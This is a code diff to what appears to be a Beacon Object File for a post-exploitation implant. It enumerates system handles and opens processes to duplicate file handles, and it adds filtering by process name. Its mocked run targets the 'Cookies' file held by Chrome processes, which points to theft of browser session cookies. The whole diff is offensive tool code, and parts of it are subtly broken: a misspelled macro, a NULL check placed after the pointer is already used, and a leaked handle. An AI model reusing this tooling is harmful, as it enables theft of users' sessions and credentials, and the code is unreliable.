@@ -5,7 +5,8 @@
 #include <shlwapi.h>
 #include <ntstatus.h>
 #include <time.h>
-
+#include <tlhelp32.h>
+#include <Psapi.h>
 #ifdef _DEBUG
 
 #pragma comment (lib, "shell32.lib")
@@ -60,6 +61,7 @@ extern "C" {
     DFR(MSVCRT, wcscmp)
     DFR(MSVCRT, wcslen)
     DFR(KERNEL32, GetFileType);
+    DFR(KERNEL32, GetProcessImageFileNameW);
     #define GetLastError KERNEL32$GetLastError
     #define SHGetFolderPathA SHELL32$SHGetFolderPathA
     #define PathAppendA SHLWAPI$PathAppendA
@@ -82,7 +84,9 @@ extern "C" {
     #define wcstombs MSVCRT$wcstombs
     #define wcscmp MSVCRT$wcscmp
     #define GetFileType KERNEL32$GetFileType
-#define wcslen MSVCRT$wcslen
+    #define wcslen MSVCRT$wcslen
+    #define GetPRocessImageFileNameW KERNEL32$GetProcessImageFileNameW
+
 
         void go(char* buf, int len) {
 
@@ -97,8 +101,16 @@ extern "C" {
         //Value will either be a wchar_t or int based off wither key value filename or handle_id was chosen
         processName = (wchar_t*)BeaconDataExtract(&parser, NULL);
         size_t processLen = wcslen(processName);
-        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to enumerate file handle to % .*S ", filenameLen, filename);
-
+        if (processName == NULL) {
+            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to enumerate file handle to % .*S ", filenameLen, filename);
+        }
+        else {
+            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to enumerate handle to file % .*S from % .*S processes", filenameLen, filename,processLen,processName);
+            for (int i = 0; processName[i] != L'\0'; i++) {
+                processName[i] = towlower(processName[i]);
+            }
+        }
+        
 
         DWORD dwErrorCode = ERROR_SUCCESS;
         PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
@@ -148,29 +160,45 @@ extern "C" {
         }
         //Iterate through System Handles
         int prevPID = 0;
+ 
         for (int i = 0; i < handleInfo->HandleCount; i++) {
             SYSTEM_HANDLE_TABLE_ENTRY_INFO objHandle;
             memset(&objHandle, 0, sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
+         
             objHandle = handleInfo->Handles[i];
             if (handleInfo->Handles[i].UniqueProcessId != prevPID) {
                 prevPID = handleInfo->Handles[i].UniqueProcessId;
+
                 if (processHandle) {
                     NtClose(processHandle);
                     processHandle = NULL;
                 }
-                processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo->Handles[i].UniqueProcessId);
+                processHandle = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, handleInfo->Handles[i].UniqueProcessId);
+
                 if (NULL == processHandle) {
-                    dwErrorCode = GetLastError();
-                    BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i", pid, dwErrorCode);
+                    //dwErrorCode = GetLastError();
                     continue;
                 }
-
+                //Check if a process name was provided. If so, only check handles in a process that includes 
+                WCHAR imageFileName[MAX_PATH];
+                if (processName) {
+                    if (GetProcessImageFileNameW(processHandle, imageFileName, MAX_PATH) > 0) {
+                        // Extract the process name from the full path
+                        WCHAR* processImagePath = wcsrchr(imageFileName, L'\\');
+                        // Initialize the file name as an empty string
+                        if (!wcsstr(processImagePath, processName)) {
+                            processHandle = NULL;
+                            continue;
+                        }
+                    }
+                }
             }
             else {
                 if (NULL == processHandle) {
                     continue;
                 }
-            }
+            }               
+  
 
             //Check if handle type is of type file
             if (handleInfo->Handles[i].ObjectTypeIndex != HANDLE_TYPE_FILE) {
@@ -299,6 +327,8 @@ extern "C" {
         if (false) {
             BeaconPrintf(CALLBACK_OUTPUT, "Error: Failed to find file handle within the specified process");
         }
+
+
     cleanup:
         if (handleInfo) {
             VirtualFree(handleInfo, 0, MEM_RELEASE);
@@ -335,7 +365,7 @@ int main(int argc, char* argv[]) {
     // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
     //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");
 
-    bof::runMocked<wchar_t*,wchar_t*>(go, L"Cookies",L"/Process");
+    bof::runMocked<wchar_t*,wchar_t*>(go, L"Cookies",L"Chrome");
     return 0;
 }
 
